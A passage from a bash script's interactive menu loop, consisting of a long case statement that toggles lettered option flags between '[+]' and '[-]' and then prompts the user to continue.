		;;
	"AV")
	if [[ "$CAV" == "[+]" ]];
	then
	CAV="[-]"
	else
		CAV="[+]"
		fi
		;;
	"AW")
	if [[ "$CAW" == "[+]" ]];
	then
	CAW="[-]"
	else
		CAW="[+]"
		fi
		;;
	"AX")
	if [[ "$CAX" == "[+]" ]];
	then
	CAX="[-]"
	else
		CAX="[+]"
		fi
		;;
	"AY")
	if [[ "$CAY" == "[+]" ]];
	then
	CAY="[-]"
	else
		CAY="[+]"
		fi
		;;
	"AZ")
	if [[ "$CAZ" == "[+]" ]];
	then
	CAZ="[-]"
	else
		CAZ="[+]"
		fi
		;;
	"BA")
	if [[ "$CBA" == "[+]" ]];
	then
	CBA="[-]"
	else
		CBA="[+]"
		fi
		;;
	"BB")
	if [[ "$CBB" == "[+]" ]];
	then
	CBB="[-]"
	else
		CBB="[+]"
		fi
		;;
	"BC")
	if [[ "$CBC" == "[+]" ]];
	then
	CBC="[-]"
	else
		CBC="[+]"
		fi
		;;
	"BD")
	if [[ "$CBD" == "[+]" ]];
	then
	CBD="[-]"
	else
		CBD="[+]"
		fi
		;;
	"BE")
	if [[ "$CBE" == "[+]" ]];
	then
	CBE="[-]"
	else
		CBE="[+]"
		fi
		;;
	"BF")
	if [[ "$CBF" == "[+]" ]];
	then
	CBF="[-]"
	else
		CBF="[+]"
		fi
		;;
	"BG")
	if [[ "$CBG" == "[+]" ]];
	then
	CBG="[-]"
	else
		CBG="[+]"
		fi
		;;
	"BH")
	if [[ "$CBH" == "[+]" ]];
	then
	CBH="[-]"
	else
		CBH="[+]"
		fi
		;;
	"BI")
	if [[ "$CBI" == "[+]" ]];
	then
	CBI="[-]"
	else
		CBI="[+]"
		fi
		;;
	"BJ")
	if [[ "$CBJ" == "[+]" ]];
	then
	CBJ="[-]"
	else
		CBJ="[+]"
		fi
		;;
	"BK")
	if [[ "$CBK" == "[+]" ]];
	then
	CBK="[-]"
	else
		CBK="[+]"
		fi
		;;
	"BL")
	if [[ "$CBL" == "[+]" ]];
	then
	CBL="[-]"
	else
		CBL="[+]"
		fi
		;;
	"BM")
	if [[ "$CBM" == "[+]" ]];
	then
	CBM="[-]"
	else
		CBM="[+]"
		fi
		;;
	"BN")
	if [[ "$CBN" == "[+]" ]];
	then
	CBN="[-]"
	else
		CBN="[+]"
		fi
		;;
	"BO")
	if [[ "$CBO" == "[+]" ]];
	then
	CBO="[-]"
	else
		CBO="[+]"
		fi
		;;
	"BP")
	if [[ "$CBP" == "[+]" ]];
	then
	CBP="[-]"
	else
		CBP="[+]"
		fi
		;;
	"BQ")
	if [[ "$CBQ" == "[+]" ]];
	then
	CBQ="[-]"
	else
		CBQ="[+]"
		fi
		;;
	"BR")
	if [[ "$CBR" == "[+]" ]];
	then
	CBR="[-]"
	else
		CBR="[+]"
		fi
		;;
	"BS")
	if [[ "$CBS" == "[+]" ]];
	then
	CBS="[-]"
	else
		CBS="[+]"
		fi
		;;
	"BT")
	if [[ "$CBT" == "[+]" ]];
	then
	CBT="[-]"
	else
		CBT="[+]"
		fi
		;;
	"BU")
	if [[ "$CBU" == "[+]" ]];
	then
	CBU="[-]"
	else
		CBU="[+]"
		fi
		;;
	"BV")
	if [[ "$CBV" == "[+]" ]];
	then
	CBV="[-]"
	else
		CBV="[+]"
		fi
		;;
	"BW")
	if [[ "$CBW" == "[+]" ]];
	then
	CBW="[-]"
	else
		CBW="[+]"
		fi
		;;
	"BX")
	if [[ "$CBX" == "[+]" ]];
	then
	CBX="[-]"
	else
		CBX="[+]"
		fi
		;;
	"BY")
	if [[ "$CBY" == "[+]" ]];
	then
	CBY="[-]"
	else
		CBY="[+]"
		fi
		;;
	"BZ")
	if [[ "$CBZ" == "[+]" ]];
	then
	CBZ="[-]"
	else
		CBZ="[+]"
		fi
		;;
	"CA")
	if [[ "$CCA" == "[+]" ]];
	then
	CCA="[-]"
	else
		CCA="[+]"
		fi
		;;
	"CB")
	if [[ "$CCB" == "[+]" ]];
	then
	CCB="[-]"
	else
		CCB="[+]"
		fi
		;;
	"CC")
	if [[ "$CCC" == "[+]" ]];
	then
	CCC="[-]"
	else
		CCC="[+]"
		fi
		;;
	"CD")
	if [[ "$CCD" == "[+]" ]];
	then
	CCD="[-]"
	else
		CCD="[+]"
		fi
		;;
	"CE")
	if [[ "$CCE" == "[+]" ]];
	then
	CCE="[-]"
	else
		CCE="[+]"
		fi
		;;
	"CF")
	if [[ "$CCF" == "[+]" ]];
	then
	CCF="[-]"
	else
		CCF="[+]"
		fi
		;;
	"CG")
	if [[ "$CCG" == "[+]" ]];
	then
	CCG="[-]"
	else
		CCG="[+]"
		fi
		;;
	"CH")
	if [[ "$CCH" == "[+]" ]];
	then
	CCH="[-]"
	else
		CCH="[+]"
		fi
		;;
	"CI")
	if [[ "$CCI" == "[+]" ]];
	then
	CCI="[-]"
	else
		CCI="[+]"
		fi
		;;
	"CJ")
	if [[ "$CCJ" == "[+]" ]];
	then
	CCJ="[-]"
	else
		CCJ="[+]"
		fi
		;;
	"CK")
	if [[ "$CCK" == "[+]" ]];
	then
	CCK="[-]"
	else
		CCK="[+]"
		fi
		;;
	"CL")
	if [[ "$CCL" == "[+]" ]];
	then
	CCL="[-]"
	else
		CCL="[+]"
		fi
		;;
	"CM")
	if [[ "$CCM" == "[+]" ]];
	then
	CCM="[-]"
	else
		CCM="[+]"
		fi
		;;
	"CN")
	if [[ "$CCN" == "[+]" ]];
	then
	CCN="[-]"
	else
		CCN="[+]"
		fi
		;;
	"CO")
	if [[ "$CCO" == "[+]" ]];
	then
	CCO="[-]"
	else
		CCO="[+]"
		fi
		;;
	"CP")
	if [[ "$CCP" == "[+]" ]];
	then
	CCP="[-]"
	else
		CCP="[+]"
		fi
		;;
	"CQ")
	if [[ "$CCQ" == "[+]" ]];
	then
	CCQ="[-]"
	else
		CCQ="[+]"
		fi
		;;
	"CR")
	if [[ "$CCR" == "[+]" ]];
	then
	CCR="[-]"
	else
		CCR="[+]"
		fi
		;;
	"CS")
	if [[ "$CCS" == "[+]" ]];
	then
	CCS="[-]"
	else
		CCS="[+]"
		fi
		;;
	"CT")
	if [[ "$CCT" == "[+]" ]];
	then
	CCT="[-]"
	else
		CCT="[+]"
		fi
		;;
	"CU")
	if [[ "$CCU" == "[+]" ]];
	then
	CCU="[-]"
	else
		CCU="[+]"
		fi
		;;
	"CV")
	if [[ "$CCV" == "[+]" ]];
	then
	CCV="[-]"
	else
		CCV="[+]"
		fi
		;;
	"CW")
	if [[ "$CCW" == "[+]" ]];
	then
	CCW="[-]"
	else
		CCW="[+]"
		fi
		;;
	"CX")
	if [[ "$CCX" == "[+]" ]];
	then
	CCX="[-]"
	else
		CCX="[+]"
		fi
		;;
	"CY")
	if [[ "$CCY" == "[+]" ]];
	then
	CCY="[-]"
	else
		CCY="[+]"
		fi
		;;
	"CZ")
	if [[ "$CCZ" == "[+]" ]];
	then
	CCZ="[-]"
	else
		CCZ="[+]"
		fi
		;;
	"DA")
	if [[ "$CDA" == "[+]" ]];
	then
	CDA="[-]"
	else
		CDA="[+]"
		fi
		;;
	"DB")
	if [[ "$CDB" == "[+]" ]];
	then
	CDB="[-]"
	else
		CDB="[+]"
		fi
		;;
	"DC")
	if [[ "$CDC" == "[+]" ]];
	then
	CDC="[-]"
	else
		CDC="[+]"
		fi
		;;
	"DD")
	if [[ "$CDD" == "[+]" ]];
	then
	CDD="[-]"
	else
		CDD="[+]"
		fi
		;;
	"DE")
	if [[ "$CDE" == "[+]" ]];
	then
	CDE="[-]"
	else
		CDE="[+]"
		fi
		;;
	"DF")
	if [[ "$CDF" == "[+]" ]];
	then
	CDF="[-]"
	else
		CDF="[+]"
		fi
		;;
	"DG")
	if [[ "$CDG" == "[+]" ]];
	then
	CDG="[-]"
	else
		CDG="[+]"
		fi
		;;
	"DH")
	if [[ "$CDH" == "[+]" ]];
	then
	CDH="[-]"
	else
		CDH="[+]"
		fi
		;;
	"DI")
	if [[ "$CDI" == "[+]" ]];
	then
	CDI="[-]"
	else
		CDI="[+]"
		fi
		;;
	"DJ")
	if [[ "$CDJ" == "[+]" ]];
	then
	CDJ="[-]"
	else
		CDJ="[+]"
		fi
		;;
	"DK")
	if [[ "$CDK" == "[+]" ]];
	then
	CDK="[-]"
	else
		CDK="[+]"
		fi
		;;
	"DL")
	if [[ "$CDL" == "[+]" ]];
	then
	CDL="[-]"
	else
		CDL="[+]"
		fi
		;;
	"DM")
	if [[ "$CDM" == "[+]" ]];
	then
	CDM="[-]"
	else
		CDM="[+]"
		fi
		;;
	"DN")
	if [[ "$CDN" == "[+]" ]];
	then
	CDN="[-]"
	else
		CDN="[+]"
		fi
		;;
	"DO")
	if [[ "$CDO" == "[+]" ]];
	then
	CDO="[-]"
	else
		CDO="[+]"
		fi
		;;
	"DP")
	if [[ "$CDP" == "[+]" ]];
	then
	CDP="[-]"
	else
		CDP="[+]"
		fi
		;;
	"DQ")
	if [[ "$CDQ" == "[+]" ]];
	then
	CDQ="[-]"
	else
		CDQ="[+]"
		fi
		;;
	"DR")
	if [[ "$CDR" == "[+]" ]];
	then
	CDR="[-]"
	else
		CDR="[+]"
		fi
		;;
	"DS")
	if [[ "$CDS" == "[+]" ]];
	then
	CDS="[-]"
	else
		CDS="[+]"
		fi
		;;
	"DT")
	if [[ "$CDT" == "[+]" ]];
	then
	CDT="[-]"
	else
		CDT="[+]"
		fi
		;;
	"DU")
	if [[ "$CDU" == "[+]" ]];
	then
	CDU="[-]"
	else
		CDU="[+]"
		fi
		;;
	"DV")
	if [[ "$CDV" == "[+]" ]];
	then
	CDV="[-]"
	else
		CDV="[+]"
		fi
		;;
	"DW")
	if [[ "$CDW" == "[+]" ]];
	then
	CDW="[-]"
	else
		CDW="[+]"
		fi
		;;
	"DX")
	if [[ "$CDX" == "[+]" ]];
	then
	CDX="[-]"
	else
		CDX="[+]"
		fi
		;;
	"DY")
	if [[ "$CDY" == "[+]" ]];
	then
	CDY="[-]"
	else
		CDY="[+]"
		fi
		;;
	"DZ")
	if [[ "$CDZ" == "[+]" ]];
	then
	CDZ="[-]"
	else
		CDZ="[+]"
		fi
		;;
	"EA")
	if [[ "$CEA" == "[+]" ]];
	then
	CEA="[-]"
	else
		CEA="[+]"
		fi
		;;
	"EB")
	if [[ "$CEB" == "[+]" ]];
	then
	CEB="[-]"
	else
		CEB="[+]"
		fi
		;;
	"EC")
	if [[ "$CEC" == "[+]" ]];
	then
	CEC="[-]"
	else
		CEC="[+]"
		fi
		;;
	"ED")
	if [[ "$CED" == "[+]" ]];
	then
	CED="[-]"
	else
		CED="[+]"
		fi
		;;
	"EE")
	if [[ "$CEE" == "[+]" ]];
	then
	CEE="[-]"
	else
		CEE="[+]"
		fi
		;;
	"EF")
	if [[ "$CEF" == "[+]" ]];
	then
	CEF="[-]"
	else
		CEF="[+]"
		fi
		;;
	"EG")
	if [[ "$CEG" == "[+]" ]];
	then
	CEG="[-]"
	else
		CEG="[+]"
		fi
		;;
	"EH")
	if [[ "$CEH" == "[+]" ]];
	then
	CEH="[-]"
	else
		CEH="[+]"
		fi
		;;
	"EI")
	if [[ "$CEI" == "[+]" ]];
	then
	CEI="[-]"
	else
		CEI="[+]"
		fi
		;;
	"EJ")
	if [[ "$CEJ" == "[+]" ]];
	then
	CEJ="[-]"
	else
		CEJ="[+]"
		fi
		;;
	"EK")
	if [[ "$CEK" == "[+]" ]];
	then
	CEK="[-]"
	else
		CEK="[+]"
		fi
		;;
	"EL")
	if [[ "$CEL" == "[+]" ]];
	then
	CEL="[-]"
	else
		CEL="[+]"
		fi
		;;
	"EM")
	if [[ "$CEM" == "[+]" ]];
	then
	CEM="[-]"
	else
		CEM="[+]"
		fi
		;;
	"EN")
	if [[ "$CEN" == "[+]" ]];
	then
	CEN="[-]"
	else
		CEN="[+]"
		fi
		;;
	"EO")
	if [[ "$CEO" == "[+]" ]];
	then
	CEO="[-]"
	else
		CEO="[+]"
		fi
		;;
	"EP")
	if [[ "$CEP" == "[+]" ]];
	then
	CEP="[-]"
	else
		CEP="[+]"
		fi
		;;
	"EQ")
	if [[ "$CEQ" == "[+]" ]];
	then
	CEQ="[-]"
	else
		CEQ="[+]"
		fi
		;;
	"ER")
	if [[ "$CER" == "[+]" ]];
	then
	CER="[-]"
	else
		CER="[+]"
		fi
		;;
	"ES")
	if [[ "$CES" == "[+]" ]];
	then
	CES="[-]"
	else
		CES="[+]"
		fi
		;;
	"ET")
	if [[ "$CET" == "[+]" ]];
	then
	CET="[-]"
	else
		CET="[+]"
		fi
		;;
	"EU")
	if [[ "$CEU" == "[+]" ]];
	then
	CEU="[-]"
	else
		CEU="[+]"
		fi
		;;
	"EV")
	if [[ "$CEV" == "[+]" ]];
	then
	CEV="[-]"
	else
		CEV="[+]"
		fi
		;;
	"EW")
	if [[ "$CEW" == "[+]" ]];
	then
	CEW="[-]"
	else
		CEW="[+]"
		fi
		;;
	"EX")
	if [[ "$CEX" == "[+]" ]];
	then
	CEX="[-]"
	else
		CEX="[+]"
		fi
		;;
	"EY")
	if [[ "$CEY" == "[+]" ]];
	then
	CEY="[-]"
	else
		CEY="[+]"
		fi
		;;
	"EZ")
	if [[ "$CEZ" == "[+]" ]];
	then
	CEZ="[-]"
	else
		CEZ="[+]"
		fi
		;;
	"FA")
	if [[ "$CFA" == "[+]" ]];
	then
	CFA="[-]"
	else
		CFA="[+]"
		fi
		;;
	"FB")
	if [[ "$CFB" == "[+]" ]];
	then
	CFB="[-]"
	else
		CFB="[+]"
		fi
		;;
	"FC")
	if [[ "$CFC" == "[+]" ]];
	then
	CFC="[-]"
	else
		CFC="[+]"
		fi
		;;
	"FD")
	if [[ "$CFD" == "[+]" ]];
	then
	CFD="[-]"
	else
		CFD="[+]"
		fi
		;;
	"FE")
	if [[ "$CFE" == "[+]" ]];
	then
	CFE="[-]"
	else
		CFE="[+]"
		fi
		;;
	"FF")
	if [[ "$CFF" == "[+]" ]];
	then
	CFF="[-]"
	else
		CFF="[+]"
		fi
		;;
	"FG")
	if [[ "$CFG" == "[+]" ]];
	then
	CFG="[-]"
	else
		CFG="[+]"
		fi
		;;
	"FH")
	if [[ "$CFH" == "[+]" ]];
	then
	CFH="[-]"
	else
		CFH="[+]"
		fi
		;;
	"FI")
	if [[ "$CFI" == "[+]" ]];
	then
	CFI="[-]"
	else
		CFI="[+]"
		fi
		;;
	"FJ")
	if [[ "$CFJ" == "[+]" ]];
	then
	CFJ="[-]"
	else
		CFJ="[+]"
		fi
		;;
	"FK")
	if [[ "$CFK" == "[+]" ]];
	then
	CFK="[-]"
	else
		CFK="[+]"
		fi
		;;
	"FL")
	if [[ "$CFL" == "[+]" ]];
	then
	CFL="[-]"
	else
		CFL="[+]"
		fi
		;;
	"FM")
	if [[ "$CFM" == "[+]" ]];
	then
	CFM="[-]"
	else
		CFM="[+]"
		fi
		;;
	"FN")
	if [[ "$CFN" == "[+]" ]];
	then
	CFN="[-]"
	else
		CFN="[+]"
		fi
		;;
	"FO")
	if [[ "$CFO" == "[+]" ]];
	then
	CFO="[-]"
	else
		CFO="[+]"
		fi
		;;
	"FP")
	if [[ "$CFP" == "[+]" ]];
	then
	CFP="[-]"
	else
		CFP="[+]"
		fi
		;;
	"FQ")
	if [[ "$CFQ" == "[+]" ]];
	then
	CFQ="[-]"
	else
		CFQ="[+]"
		fi
		;;
	"FR")
	if [[ "$CFR" == "[+]" ]];
	then
	CFR="[-]"
	else
		CFR="[+]"
		fi
		;;
	"FS")
	if [[ "$CFS" == "[+]" ]];
	then
	CFS="[-]"
	else
		CFS="[+]"
		fi
		;;
	"FT")
	if [[ "$CFT" == "[+]" ]];
	then
	CFT="[-]"
	else
		CFT="[+]"
		fi
		;;
	"FU")
	if [[ "$CFU" == "[+]" ]];
	then
	CFU="[-]"
	else
		CFU="[+]"
		fi
		;;
	"FV")
	if [[ "$CFV" == "[+]" ]];
	then
	CFV="[-]"
	else
		CFV="[+]"
		fi
		;;
	"FW")
	if [[ "$CFW" == "[+]" ]];
	then
	CFW="[-]"
	else
		CFW="[+]"
		fi
		;;
	"FX")
	if [[ "$CFX" == "[+]" ]];
	then
	CFX="[-]"
	else
		CFX="[+]"
		fi
		;;
	"FY")
	if [[ "$CFY" == "[+]" ]];
	then
	CFY="[-]"
	else
		CFY="[+]"
		fi
		;;
	"FZ")
	if [[ "$CFZ" == "[+]" ]];
	then
	CFZ="[-]"
	else
		CFZ="[+]"
		fi
		;;
	"GA")
	if [[ "$CGA" == "[+]" ]];
	then
	CGA="[-]"
	else
		CGA="[+]"
		fi
		;;
	"GB")
	if [[ "$CGB" == "[+]" ]];
	then
	CGB="[-]"
	else
		CGB="[+]"
		fi
		;;
	"GC")
	if [[ "$CGC" == "[+]" ]];
	then
	CGC="[-]"
	else
		CGC="[+]"
		fi
		;;
	"GD")
	if [[ "$CGD" == "[+]" ]];
	then
	CGD="[-]"
	else
		CGD="[+]"
		fi
		;;
	"GE")
	if [[ "$CGE" == "[+]" ]];
	then
	CGE="[-]"
	else
		CGE="[+]"
		fi
		;;
	"GF")
	if [[ "$CGF" == "[+]" ]];
	then
	CGF="[-]"
	else
		CGF="[+]"
		fi
		;;
	"GG")
	if [[ "$CGG" == "[+]" ]];
	then
	CGG="[-]"
	else
		CGG="[+]"
		fi
		;;
	"GH")
	if [[ "$CGH" == "[+]" ]];
	then
	CGH="[-]"
	else
		CGH="[+]"
		fi
		;;
	"GI")
	if [[ "$CGI" == "[+]" ]];
	then
	CGI="[-]"
	else
		CGI="[+]"
		fi
		;;
	"GJ")
	if [[ "$CGJ" == "[+]" ]];
	then
	CGJ="[-]"
	else
		CGJ="[+]"
		fi
		;;
	"GK")
	if [[ "$CGK" == "[+]" ]];
	then
	CGK="[-]"
	else
		CGK="[+]"
		fi
		;;
	"GL")
	if [[ "$CGL" == "[+]" ]];
	then
	CGL="[-]"
	else
		CGL="[+]"
		fi
		;;
	"GM")
	if [[ "$CGM" == "[+]" ]];
	then
	CGM="[-]"
	else
		CGM="[+]"
		fi
		;;
	"GN")
	if [[ "$CGN" == "[+]" ]];
	then
	CGN="[-]"
	else
		CGN="[+]"
		fi
		;;
	"GO")
	if [[ "$CGO" == "[+]" ]];
	then
	CGO="[-]"
	else
		CGO="[+]"
		fi
		;;
	"GP")
	if [[ "$CGP" == "[+]" ]];
	then
	CGP="[-]"
	else
		CGP="[+]"
		fi
		;;
	"GQ")
	if [[ "$CGQ" == "[+]" ]];
	then
	CGQ="[-]"
	else
		CGQ="[+]"
		fi
		;;
	"GR")
	if [[ "$CGR" == "[+]" ]];
	then
	CGR="[-]"
	else
		CGR="[+]"
		fi
		;;
	"GS")
	if [[ "$CGS" == "[+]" ]];
	then
	CGS="[-]"
	else
		CGS="[+]"
		fi
		;;
	"GT")
	if [[ "$CGT" == "[+]" ]];
	then
	CGT="[-]"
	else
		CGT="[+]"
		fi
		;;
	"GU")
	if [[ "$CGU" == "[+]" ]];
	then
	CGU="[-]"
	else
		CGU="[+]"
		fi
		;;
	"GV")
	if [[ "$CGV" == "[+]" ]];
	then
	CGV="[-]"
	else
		CGV="[+]"
		fi
		;;
	"GW")
	if [[ "$CGW" == "[+]" ]];
	then
	CGW="[-]"
	else
		CGW="[+]"
		fi
		;;
	"GX")
	if [[ "$CGX" == "[+]" ]];
	then
	CGX="[-]"
	else
		CGX="[+]"
		fi
		;;
	"GY")
	if [[ "$CGY" == "[+]" ]];
	then
	CGY="[-]"
	else
		CGY="[+]"
		fi
		;;
	"GZ")
	if [[ "$CGZ" == "[+]" ]];
	then
	CGZ="[-]"
	else
		CGZ="[+]"
		fi
		;;
	"HA")
	if [[ "$CHA" == "[+]" ]];
	then
	CHA="[-]"
	else
		CHA="[+]"
		fi
		;;
	"HB")
	if [[ "$CHB" == "[+]" ]];
	then
	CHB="[-]"
	else
		CHB="[+]"
		fi
		;;
	"HC")
	if [[ "$CHC" == "[+]" ]];
	then
	CHC="[-]"
	else
		CHC="[+]"
		fi
		;;
	"HD")
	if [[ "$CHD" == "[+]" ]];
	then
	CHD="[-]"
	else
		CHD="[+]"
		fi
		;;
	"HE")
	if [[ "$CHE" == "[+]" ]];
	then
	CHE="[-]"
	else
		CHE="[+]"
		fi
		;;
	"HF")
	if [[ "$CHF" == "[+]" ]];
	then
	CHF="[-]"
	else
		CHF="[+]"
		fi
		;;
	"HG")
	if [[ "$CHG" == "[+]" ]];
	then
	CHG="[-]"
	else
		CHG="[+]"
		fi
		;;
	"HH")
	if [[ "$CHH" == "[+]" ]];
	then
	CHH="[-]"
	else
		CHH="[+]"
		fi
		;;
	"HI")
	if [[ "$CHI" == "[+]" ]];
	then
	CHI="[-]"
	else
		CHI="[+]"
		fi
		;;
	"HJ")
	if [[ "$CHJ" == "[+]" ]];
	then
	CHJ="[-]"
	else
		CHJ="[+]"
		fi
		;;
	"HK")
	if [[ "$CHK" == "[+]" ]];
	then
	CHK="[-]"
	else
		CHK="[+]"
		fi
		;;
	"HL")
	if [[ "$CHL" == "[+]" ]];
	then
	CHL="[-]"
	else
		CHL="[+]"
		fi
		;;
	"HM")
	if [[ "$CHM" == "[+]" ]];
	then
	CHM="[-]"
	else
		CHM="[+]"
		fi
		;;
	"HN")
	if [[ "$CHN" == "[+]" ]];
	then
	CHN="[-]"
	else
		CHN="[+]"
		fi
		;;
	"HO")
		if [[ "$CHO" == "[+]" ]];
		then
			CHO="[-]"
		else
			CHO="[+]"
		fi
	;;
	"HP")
		if [[ "$CHP" == "[+]" ]];
		then
			CHP="[-]"
		else
			CHP="[+]"
		fi
	;;
	"HQ")
		if [[ "$CHQ" == "[+]" ]];
		then
			CHQ="[-]"
		else
			CHQ="[+]"
		fi
	;;
	"HR")
		if [[ "$CHR" == "[+]" ]];
		then
			CHR="[-]"
		else
			CHR="[+]"
		fi
	;;
	"HS")
		if [[ "$CHS" == "[+]" ]];
		then
			CHS="[-]"
		else
			CHS="[+]"
		fi
	;;
	"ZZ")
		if [[ "$CZZ" == "[+]" ]];
		then
			CZZ="[-]"
		else
			CZZ="[+]"
		fi
	;;
	*)
		echo "error, invalid choice"
	;;
	esac
	read -p "$FMSG"
	echo -ne "\n$SEP\n\n"
done
